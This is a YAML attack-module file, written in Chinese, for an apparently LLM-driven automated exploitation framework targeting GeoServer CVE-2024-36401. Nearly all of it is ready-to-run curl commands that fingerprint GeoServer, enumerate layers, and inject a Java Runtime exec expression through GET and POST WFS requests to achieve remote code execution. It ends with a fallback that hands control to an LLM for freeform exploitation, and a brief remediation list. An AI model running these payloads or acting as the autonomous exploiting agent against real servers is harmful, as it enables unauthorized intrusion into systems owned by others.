# ═══════════════════════════════════════════════════════════
# GeoServer CVE-2024-36401 — OGC Filter 属性名表达式 RCE
#
# 原理: WFS/OWS 接口的 valueReference 参数会被当作 XPath 表达式
#       执行，通过 exec(java.lang.Runtime.getRuntime(),'cmd') 实现 RCE
# 复杂度: 低 — 单条 GET 请求直接打
# ═══════════════════════════════════════════════════════════
skill_id: geoserver_rce
name: "GeoServer 属性名表达式 RCE (CVE-2024-36401)"
category: web_rce
version: "1.0"

principle: |
  GeoServer 在处理 OGC 过滤器时，使用 Apache Commons JXPath 库
  对 valueReference 参数进行 XPath 评估。攻击者可以注入
  exec(java.lang.Runtime.getRuntime(), 'cmd') 表达式实现 RCE。

  利用条件：
  - GeoServer ≤ 2.25.1 / ≤ 2.24.3 / ≤ 2.23.5
  - WFS 或 OWS 服务启用（默认启用）
  - 需要知道至少一个有效的 typeNames（图层名）

  关键点：
  - typeNames 必须存在，否则返回 InvalidParameterValue
  - 常见默认图层: sf:archsites, topp:states, tiger:poi
  - 命令输出在 XML 响应中，或者通过 ClassCastException 确认执行

match:
  rules:
    - fingerprint_contains: ["geoserver"]
    - fingerprint_contains: ["GeoServer"]
    - evidence_contains: ["geoserver"]
    - evidence_contains: ["GeoServer"]
    - evidence_contains: ["WFS", "WMS"]
    - cve_matches: ["CVE-2024-36401"]

probes:
  - id: confirm_geoserver
    description: "确认 GeoServer 存在并获取版本"
    steps:
      - command: |
          curl -s {ENDPOINT}/geoserver/web/ --max-time 10 2>/dev/null
        parse_rules:
          - if_contains: ["GeoServer", "geoserver"]
            set: { geoserver_confirmed: true }

      # 没有 /geoserver/ 前缀的情况（直接部署在根路径）
      - command: |
          curl -s {ENDPOINT}/web/ --max-time 10 2>/dev/null
        parse_rules:
          - if_contains: ["GeoServer", "geoserver"]
            set: { geoserver_confirmed: true, no_prefix: true }

  - id: discover_layers
    description: "通过 GetCapabilities 获取可用图层名"
    depends_on: { geoserver_confirmed: true }
    command: |
      # 尝试两种 URL 格式
      for base in "{ENDPOINT}/geoserver" "{ENDPOINT}"; do
        resp=$(curl -s "${base}/wfs?service=WFS&request=GetCapabilities" --max-time 15 2>/dev/null)
        if echo "$resp" | grep -qi "FeatureType"; then
          # 提取 typeNames
          layer=$(echo "$resp" | grep -oP '<Name>[^<]+</Name>' | head -1 | sed 's/<[^>]*>//g')
          if [ -n "$layer" ]; then
            echo "LAYER_FOUND:${layer}"
            echo "BASE_URL:${base}"
          fi
          break
        fi
      done
      # 默认图层兜底
      echo "DEFAULT_LAYERS:sf:archsites,topp:states,tiger:poi"
    timeout: 20
    parse_rules:
      - if_regex: "LAYER_FOUND:(.+)"
        set: { layer_discovered: true }
      - if_regex: "BASE_URL:(.+)"
        set: { base_url_found: true }
      - if_contains: ["DEFAULT_LAYERS"]
        set: { has_default_layers: true }

exploit_paths:
  # ═══ 路径 A: OWS/WFS GetPropertyValue RCE（GET 请求）═══
  - path_id: ows_rce
    name: "OWS GetPropertyValue 表达式注入 RCE"
    priority: 1
    principle: |
      通过 WFS GetPropertyValue 请求的 valueReference 参数注入
      exec() 表达式。先用发现的图层名，再用默认图层名兜底。
    conditions:
      geoserver_confirmed: true
    steps:
      - id: rce_discovered_layer
        description: "用发现的图层名尝试 RCE"
        command: |
          # 从 GetCapabilities 中提取图层名
          for base in "{ENDPOINT}/geoserver" "{ENDPOINT}"; do
            resp=$(curl -s "${base}/wfs?service=WFS&request=GetCapabilities" --max-time 15 2>/dev/null)
            layer=$(echo "$resp" | grep -oP '<Name>[^<]+</Name>' | head -1 | sed 's/<[^>]*>//g')
            if [ -n "$layer" ]; then
              echo "[*] 发现图层: $layer (base: $base)"
              # 尝试 OWS 接口
              result=$(curl -s "${base}/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=${layer}&valueReference=exec(java.lang.Runtime.getRuntime(),'id')" --max-time 15 2>/dev/null)
              echo "$result"
              if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
                echo "GEOSERVER_RCE_SUCCESS"
                break
              fi
              # 尝试 WFS 接口
              result=$(curl -s "${base}/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=${layer}&valueReference=exec(java.lang.Runtime.getRuntime(),'id')" --max-time 15 2>/dev/null)
              echo "$result"
              if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
                echo "GEOSERVER_RCE_SUCCESS"
                break
              fi
            fi
          done
        timeout: 60
        success_criteria:
          stdout_contains_any: ["uid=", "GEOSERVER_RCE_SUCCESS"]
        on_success: conclude_success
        on_fail: rce_default_layers
        evidence_capture:
          shell_type: "rce_geoserver_ows"

      - id: rce_default_layers
        description: "用默认图层名遍历尝试 RCE"
        command: |
          DEFAULT_LAYERS="sf:archsites topp:states tiger:poi sf:bugsites sf:restricted sf:streams sf:DEM topp:tasmania_roads"
          for base in "{ENDPOINT}/geoserver" "{ENDPOINT}"; do
            for layer in $DEFAULT_LAYERS; do
              for svc in ows wfs; do
                result=$(curl -s "${base}/${svc}?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=${layer}&valueReference=exec(java.lang.Runtime.getRuntime(),'id')" --max-time 10 2>/dev/null)
                if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
                  echo "[+] 命中: ${base}/${svc} layer=${layer}"
                  echo "$result"
                  echo "GEOSERVER_RCE_SUCCESS"
                  exit 0
                fi
              done
            done
          done
          echo "ALL_LAYERS_FAILED"
        timeout: 120
        success_criteria:
          stdout_contains_any: ["uid=", "GEOSERVER_RCE_SUCCESS"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_geoserver_default_layer"

  # ═══ 路径 B: POST XML 方式 RCE ═══
  - path_id: post_xml_rce
    name: "POST XML WFS GetPropertyValue RCE"
    priority: 2
    principle: |
      通过 POST XML 请求体发送 GetPropertyValue 请求。
      某些配置下 GET 参数被过滤但 POST XML 不受限。
    conditions:
      geoserver_confirmed: true
    steps:
      - id: post_rce
        description: "POST XML 方式执行 RCE"
        command: |
          for base in "{ENDPOINT}/geoserver" "{ENDPOINT}"; do
            for layer in "sf:archsites" "topp:states" "tiger:poi"; do
              result=$(curl -s -X POST "${base}/wfs" \
                -H "Content-Type: application/xml" \
                -d "<wfs:GetPropertyValue service='WFS' version='2.0.0'
                     xmlns:sf='http://cite.opengeospatial.org/gmlsf'
                     xmlns:fes='http://www.opengis.net/fes/2.0'
                     xmlns:wfs='http://www.opengis.net/wfs/2.0'>
                  <wfs:Query typeNames='${layer}'/>
                  <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'id')</wfs:valueReference>
                </wfs:GetPropertyValue>" \
                --max-time 15 2>/dev/null)
              if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
                echo "[+] POST 命中: ${base}/wfs layer=${layer}"
                echo "$result"
                echo "GEOSERVER_RCE_SUCCESS"
                exit 0
              fi
            done
          done
          echo "POST_ALL_FAILED"
        timeout: 90
        success_criteria:
          stdout_contains_any: ["uid=", "GEOSERVER_RCE_SUCCESS"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_geoserver_post"

  # ═══ 路径 C: LLM 兜底 ═══
  - path_id: llm_freeform
    name: "LLM 自由推理（限定 GeoServer RCE 范围）"
    priority: 99
    mode: react_freeform
    max_rounds: 5
    conditions:
      geoserver_confirmed: true

remediation: |
  1. 升级 GeoServer 至 2.25.2 / 2.24.4 / 2.23.6 或更高版本
  2. 删除 gt-complex 模块中的 evaluate 评估功能
  3. 限制 WFS/OWS 接口的公网访问
